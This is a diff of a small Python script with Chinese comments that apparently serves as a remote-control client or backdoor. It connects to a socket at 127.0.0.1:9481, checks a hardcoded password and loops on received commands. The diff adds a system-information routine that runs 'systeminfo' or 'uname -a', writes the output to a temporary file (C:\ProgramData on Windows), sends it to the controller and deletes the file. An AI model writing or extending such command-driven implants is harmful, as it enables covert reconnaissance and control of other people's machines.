@@ -4,12 +4,14 @@
 # 导入socket库:
 import socket
 import time
+import os
 
 # 变量定义
 ACTIVE = 1
 IP = '127.0.0.1'
 PORT = 9481
 PASS = 'AC131'
+SYS =  None
 
 #文字颜色
 # 红色 \033[0;31;48m[!]\033[0m
@@ -39,7 +41,7 @@ def Passive():
         if PassCheck(sock):
             return sock
             
-
+# 验证
 def PassCheck(sock):
     while True:
         cmd = sock.recv(1024)
@@ -50,13 +52,40 @@ def PassCheck(sock):
         else:
             sock.send(b'NoAccess')
             return False
-        
+
+# 获取系统信息
+def Getinfo(sock):
+    if SYS == 'nt':
+        os.system('echo nt@ > C:\\ProgramData\\info.txt')
+        os.system('systeminfo >> C:\\ProgramData\\info.txt')
+        f = open('C:\\ProgramData\\info.txt','r')
+        data = f.read()
+        f.close()
+        data = data.encode('utf-8')
+        sock.send(data)
+        sock.send(b'End')
+        os.system('del /f /q C:\\ProgramData\\info.txt')
+        return
+    else:
+        os.system('echo posix@ > info.txt')
+        os.system('uname -a >> info.txt')
+        f = open('info.txt','r')
+        data = f.read()
+        f.close()
+        data = data.encode('utf-8')
+        sock.send(data)
+        print(data)
+        sock.send(b'End')
+        os.system('rm -f info.txt')
+        return
+
 
 # 主程序
 if ACTIVE == 0:
     s = Passive()
 else:
     s = Active()
+SYS = os.name
 while True:
     # 每次最多接收1k字节:
     d = s.recv(1024)
@@ -64,6 +93,6 @@ while True:
         s.send(b'Bye')
         break
     elif d == b'1':
-        print('ok')
+        Getinfo(s)
 print('bye')
 s.close()
